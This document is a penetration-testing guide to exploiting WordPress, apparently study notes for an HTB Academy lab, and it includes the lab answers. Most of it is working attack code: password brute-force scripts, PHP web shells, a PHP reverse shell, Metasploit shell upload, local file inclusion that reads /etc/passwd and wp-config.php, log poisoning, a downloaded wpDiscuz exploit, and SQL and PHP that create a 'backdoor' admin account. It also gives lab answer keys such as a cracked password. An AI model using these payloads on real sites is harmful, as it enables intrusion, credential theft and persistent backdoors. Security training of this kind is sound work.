# ⚔️ WordPress Attacks & Exploitation

> **🎯 Objective:** Transform enumeration findings into actionable attacks, achieving code execution and system compromise through WordPress vulnerabilities and misconfigurations.

## Overview

After completing WordPress enumeration, we move to the exploitation phase. WordPress presents multiple attack vectors including credential-based attacks, theme manipulation, plugin vulnerabilities, and core exploits. This section covers systematic approaches to gaining initial access and escalating privileges.

**Attack Categories:**
- **🔐 Authentication Attacks** - Brute force and credential compromise
- **💻 Code Execution** - Theme editor manipulation and file upload bypasses
- **🔧 Automated Exploitation** - Metasploit and framework-based attacks
- **🎯 Plugin Vulnerabilities** - CVE exploitation and zero-day techniques

---

## Prerequisites

Before proceeding with attacks, ensure completion of:
1. **[WordPress Discovery & Enumeration](wordpress-discovery-enumeration.md)** - Target reconnaissance
2. **Valid user accounts identified** - Username enumeration results
3. **Plugin versions documented** - Vulnerability research completed
4. **WordPress version confirmed** - Core exploit mapping

---

## Authentication Attacks

### Login Brute Force with WPScan

#### XML-RPC Method (Preferred)
```bash
# Fast XML-RPC brute force attack
wpscan --password-attack xmlrpc \
  -t 20 \
  -U admin,john \
  -P /usr/share/wordlists/rockyou.txt \
  --url http://blog.inlanefreight.local

# XML-RPC advantages:
# - Faster than wp-login method
# - Multiple login attempts per request
# - Less likely to trigger rate limiting
```

#### Traditional wp-login Method
```bash
# Standard login page brute force
wpscan --password-attack wp-login \
  -t 10 \
  -U admin \
  -P /usr/share/wordlists/rockyou.txt \
  --url http://blog.inlanefreight.local

# Use when XML-RPC is disabled or blocked
```

#### Targeted User Attack
```bash
# Focus on specific user with custom wordlist
wpscan --password-attack xmlrpc \
  -U john \
  -P custom_passwords.txt \
  --url http://blog.inlanefreight.local

# Single user attack with high thread count
wpscan --password-attack xmlrpc \
  -t 50 \
  -U john \
  -P /usr/share/wordlists/rockyou.txt \
  --url http://blog.inlanefreight.local
```

### Manual Brute Force Techniques

#### Custom Login Attack Scripts
```bash
#!/bin/bash
# manual-wp-brute.sh - Custom WordPress brute force

target="http://blog.inlanefreight.local"
user="john"
wordlist="/usr/share/wordlists/rockyou.txt"

while IFS= read -r password; do
    response=$(curl -s -X POST "$target/wp-login.php" \
        -d "log=$user&pwd=$password&wp-submit=Log+In" \
        -L)
    
    if [[ $response != *"The password for username"* ]] && [[ $response != *"not registered"* ]]; then
        echo "[+] Success: $user:$password"
        exit 0
    fi
done < "$wordlist"
```

#### Hydra Integration
```bash
# Alternative brute force with Hydra
hydra -l john -P /usr/share/wordlists/rockyou.txt \
  blog.inlanefreight.local http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password for username"
```

---

## Code Execution Techniques

### Theme Editor Exploitation

#### Step 1: Administrative Access Required
```bash
# Prerequisites:
# - Valid admin/editor credentials
# - Theme editing permissions enabled
# - Access to wp-admin panel
```

#### Step 2: Theme Selection Strategy
```bash
# Target inactive themes to avoid site disruption
# Common inactive themes:
# - Twenty Nineteen
# - Twenty Twenty
# - Twenty Twenty-One

# Check current active theme first:
curl -s http://blog.inlanefreight.local | grep themes | head -1
```

#### Step 3: Web Shell Injection

**Simple Command Execution:**
```php
<?php
// Add to 404.php or footer.php
system($_GET['cmd']);
?>
```

**Advanced PHP Web Shell:**
```php
<?php
// Multi-functional web shell
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}

if(isset($_GET['file'])) {
    $file = $_GET['file'];
    if(file_exists($file)) {
        echo "<pre>" . file_get_contents($file) . "</pre>";
    }
}

if(isset($_POST['upload'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "File uploaded successfully!";
}
?>

<!-- Usage examples:
?cmd=id
?cmd=ls -la
?file=/etc/passwd
-->
```

#### Step 4: Web Shell Access
```bash
# Access web shell through theme path
curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?cmd=id"

# Expected output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Command execution examples
curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?cmd=whoami"
curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?cmd=pwd"
curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?cmd=ls+-la"
```

### Reverse Shell Establishment

#### PHP Reverse Shell
```php
<?php
// Add to theme file for reverse shell
$ip = 'YOUR_IP';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

#### Netcat Listener Setup
```bash
# Start listener on attacking machine
nc -nlvp 4444

# Trigger reverse shell
curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php"
```

---

## Metasploit Exploitation

### wp_admin_shell_upload Module

#### Module Configuration
```bash
# Start Metasploit
msfconsole

# Load WordPress admin shell upload module
use exploit/unix/webapp/wp_admin_shell_upload

# Set required options
set USERNAME john
set PASSWORD firebird1
set RHOSTS 10.129.42.195
set VHOST blog.inlanefreight.local
set LHOST 10.10.14.15
set LPORT 4444
```

#### Module Options Verification
```bash
# Verify all settings
show options

# Required parameters:
# USERNAME  - Valid WordPress username
# PASSWORD  - User's password
# RHOSTS    - Target IP address
# VHOST     - Virtual host (if required)
# LHOST     - Attacking machine IP
# LPORT     - Listener port
```

#### Exploitation Execution
```bash
# Launch exploit
exploit

# Expected output:
[*] Authenticating with WordPress using john:firebird1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/[RANDOM]/[RANDOM].php...
[*] Meterpreter session 1 opened

# Verify access
getuid
sysinfo
pwd
```

### Meterpreter Post-Exploitation

#### System Information Gathering
```bash
# Meterpreter commands for reconnaissance
sysinfo                    # System information
getuid                     # Current user context
ps                         # Running processes
netstat                    # Network connections
route                      # Network routes
```

#### File System Exploration
```bash
# Navigate and explore
pwd                        # Current directory
ls                         # Directory listing
cd /var/www/html          # Navigate to web root
download flag.txt         # Download files
search -f config.php      # Find configuration files
```

---

## Plugin Vulnerability Exploitation

### mail-masta Plugin LFI

#### Vulnerability Analysis
```php
// Vulnerable code in mail-masta plugin
<?php 
include($_GET['pl']);
// No input validation - direct file inclusion
?>
```

#### Local File Inclusion Exploitation
```bash
# Basic LFI attack
curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"

# Common files to target:
curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/hosts"
curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/log/apache2/access.log"
curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/proc/version"
```

#### WordPress Configuration Disclosure
```bash
# Extract WordPress configuration
curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=../../../wp-config.php"

# Look for database credentials:
# define('DB_NAME', 'database_name');
# define('DB_USER', 'username');
# define('DB_PASSWORD', 'password');
# define('DB_HOST', 'localhost');
```

#### Log Poisoning Attack
```bash
# Poison access logs via User-Agent
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
  "http://blog.inlanefreight.local/"

# Execute commands through poisoned log
curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/log/apache2/access.log&cmd=id"
```

### wpDiscuz Plugin RCE

#### Vulnerability Overview
```bash
# wpDiscuz 7.0.4 - File Upload Bypass (CVE-2020-24186)
# Allows unauthenticated PHP file upload
# Bypasses MIME type validation
# Results in remote code execution
```

#### Automated Exploitation
```bash
# Download exploit script
wget https://github.com/hevox/CVE-2020-24186/raw/master/wp_discuz.py

# Execute exploit
python3 wp_discuz.py -u http://blog.inlanefreight.local -p "/?p=1"

# Example output:
[+] Generating random name for Webshell...
[!] Generated webshell name: uthsdkbywoxeebg
[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path: wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php
```

#### Manual Web Shell Access
```bash
# Access uploaded web shell
curl -s "http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id"

# Output includes GIF header bypass:
GIF689a;
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Execute additional commands
curl -s "http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=whoami"
curl -s "http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=ls+-la"
```

---

## Advanced Attack Techniques

### WordPress Core Exploits

#### Version-Specific Attacks
```bash
# Check WordPress version vulnerabilities
searchsploit wordpress 5.8
searchsploit wordpress core

# Common WordPress core vulnerabilities:
# - REST API exposure
# - Authenticated arbitrary file deletion
# - Password reset vulnerabilities
# - XML-RPC amplification attacks
```

#### XML-RPC Abuse
```bash
# XML-RPC DDoS amplification
curl -X POST http://blog.inlanefreight.local/xmlrpc.php \
  -d '<?xml version="1.0"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://attacker.com/</string></value></param>
<param><value><string>http://blog.inlanefreight.local/existing-post/</string></value></param>
</params>
</methodCall>'
```

### Database Access Exploitation

#### wp-config.php Credentials
```bash
# Extract database credentials from wp-config.php
# Through LFI or direct file access
grep -E "(DB_NAME|DB_USER|DB_PASSWORD|DB_HOST)" wp-config.php

# Connect to database if accessible
mysql -h localhost -u db_user -p database_name
```

#### WordPress Database Manipulation
```sql
-- WordPress database tables of interest:
-- wp_users (user accounts and passwords)
-- wp_usermeta (user metadata and capabilities)
-- wp_options (site configuration)
-- wp_posts (content and pages)

-- Create new admin user
INSERT INTO wp_users (user_login, user_pass, user_email, user_status, display_name) 
VALUES ('backdoor', MD5('password123'), 'admin@site.com', 0, 'Backdoor Admin');

-- Grant admin privileges
INSERT INTO wp_usermeta (user_id, meta_key, meta_value) 
VALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');
```

---

## Post-Exploitation Activities

### Persistence Mechanisms

#### Web Shell Maintenance
```bash
# Multiple web shell deployment
# 1. Theme file modification (404.php, footer.php)
# 2. Plugin directory placement
# 3. Upload directory web shells
# 4. Hidden .htaccess modifications
```

#### User Account Creation
```php
// PHP script to create WordPress admin user
<?php
require_once('wp-config.php');
require_once('wp-includes/wp-db.php');
require_once('wp-includes/user.php');

$username = 'backdoor';
$password = 'password123';
$email = 'admin@site.com';

$user_id = wp_create_user($username, $password, $email);
$user = new WP_User($user_id);
$user->set_role('administrator');
?>
```

### Data Extraction

#### Sensitive File Collection
```bash
# Configuration files
cat wp-config.php
cat .htaccess
find . -name "*.conf" -type f

# User uploads and media
ls -la wp-content/uploads/
find wp-content/uploads/ -name "*.pdf" -o -name "*.doc" -o -name "*.xlsx"

# Database backups
find . -name "*.sql" -o -name "*.db" -o -name "*backup*"
```

#### WordPress-Specific Intelligence
```bash
# Installed plugins and themes
ls -la wp-content/plugins/
ls -la wp-content/themes/

# Plugin configuration files
find wp-content/plugins/ -name "config.php" -o -name "settings.php"

# User enumeration from database
mysql -e "SELECT user_login, user_email, user_status FROM wp_users;"
```

---

## HTB Academy Lab Solutions

### Lab 1: User Enumeration
**Question:** "Perform user enumeration against http://blog.inlanefreight.local. Aside from admin, what is the other user present?"

**Solution:**
```bash
# Method 1: WPScan user enumeration
wpscan --url http://blog.inlanefreight.local --enumerate u

# Method 2: Manual author enumeration
for i in {1..10}; do
  curl -s "http://blog.inlanefreight.local/?author=$i" | grep -i "author"
done

# Method 3: REST API enumeration
curl -s "http://blog.inlanefreight.local/wp-json/wp/v2/users" | jq '.[].slug'

# Expected answer: john
```

### Lab 2: Password Brute Force
**Question:** "Perform a login bruteforcing attack against the discovered user. Submit the user's password as the answer."

**Solution:**
```bash
# WPScan brute force attack
wpscan --password-attack xmlrpc \
  -t 20 \
  -U john \
  -P /usr/share/wordlists/rockyou.txt \
  --url http://blog.inlanefreight.local

# Alternative smaller wordlist for faster results
wpscan --password-attack xmlrpc \
  -U john \
  -P /usr/share/wordlists/fasttrack.txt \
  --url http://blog.inlanefreight.local

# Expected answer: firebird1
```

### Lab 3: System User Discovery
**Question:** "Using the methods shown in this section, find another system user whose login shell is set to /bin/bash."

**Solution:**
```bash
# Exploit mail-masta LFI to read /etc/passwd
curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd" | grep "/bin/bash"

# Alternative: Use theme editor web shell
# 1. Login with john:firebird1
# 2. Add system($_GET['cmd']); to 404.php
# 3. Execute: ?cmd=cat /etc/passwd
curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?cmd=cat+/etc/passwd" | grep "/bin/bash"

# Expected answer: ubuntu (or similar system user)
```

### Lab 4: Code Execution and Flag Retrieval
**Question:** "Following the steps in this section, obtain code execution on the host and submit the contents of the flag.txt file in the webroot."

**Solution:**
```bash
# Method 1: Theme Editor Approach
# 1. Login to wp-admin with john:firebird1
# 2. Go to Appearance -> Theme Editor
# 3. Select Twenty Nineteen theme
# 4. Edit 404.php and add: system($_GET['cmd']);
# 5. Execute commands via web shell

curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?cmd=find+/var/www/html+-name+flag.txt"
curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?cmd=cat+/var/www/html/flag.txt"

# Method 2: wpDiscuz Exploit
python3 wp_discuz.py -u http://blog.inlanefreight.local -p "/?p=1"
curl "http://blog.inlanefreight.local/wp-content/uploads/2021/08/[WEBSHELL].php?cmd=cat+/var/www/html/flag.txt"

# Method 3: Metasploit
use exploit/unix/webapp/wp_admin_shell_upload
set USERNAME john
set PASSWORD firebird1
set RHOSTS 10.129.42.195
set VHOST blog.inlanefreight.local
exploit
cat /var/www/html/flag.txt

# Expected answer: [FLAG_CONTENT]
```

---

## Security Cleanup & Artifacts

### Post-Engagement Cleanup

#### Files to Remove
```bash
# Web shells and backdoors
rm /wp-content/themes/twentynineteen/404.php.bak
rm /wp-content/uploads/*/webshell*.php
rm /wp-content/plugins/malicious-plugin/

# Metasploit artifacts
find /wp-content/plugins/ -name "*random*.php" -delete
```

#### Log Evidence
```bash
# Access logs showing exploitation attempts
tail -f /var/log/apache2/access.log | grep -E "(404\.php|count_of_send\.php|xmlrpc\.php)"

# WordPress logs (if enabled)
tail -f /var/log/wp-errors.log
```

### Report Documentation

#### Testing Artifacts to Document
```
1. Modified theme files:
   - /wp-content/themes/twentynineteen/404.php

2. Uploaded web shells:
   - /wp-content/uploads/[YEAR]/[MONTH]/[RANDOM].php

3. Created user accounts:
   - Username: backdoor (if created)

4. Plugin artifacts:
   - Metasploit plugin directories

5. Configuration changes:
   - Modified .htaccess (if applicable)
```

---

## Defensive Recommendations

### Immediate Actions
```bash
# Update WordPress core and plugins
wp core update
wp plugin update --all
wp theme update --all

# Disable XML-RPC if not needed
# Add to wp-config.php:
add_filter('xmlrpc_enabled', '__return_false');

# Limit login attempts
# Install plugins like Limit Login Attempts Reloaded
```

### Security Hardening
```bash
# File permissions
find /wp-content -type f -exec chmod 644 {} \;
find /wp-content -type d -exec chmod 755 {} \;
chmod 600 wp-config.php

# Disable theme/plugin editing
# Add to wp-config.php:
define('DISALLOW_FILE_EDIT', true);

# Hide WordPress version
remove_action('wp_head', 'wp_generator');
```

---

## Next Steps

After WordPress compromise:
1. **[Privilege Escalation](../privilege-escalation/)** - Escalate from www-data to root
2. **[Lateral Movement](../lateral-movement/)** - Move to other systems
3. **[Persistence](../persistence/)** - Maintain long-term access
4. **[Data Exfiltration](../data-exfiltration/)** - Extract sensitive information

**💡 Key Takeaway:** WordPress attacks often provide initial web application access. Combining enumeration findings with systematic exploitation techniques enables reliable compromise of vulnerable WordPress installations. Always document artifacts and clean up testing evidence during professional engagements. 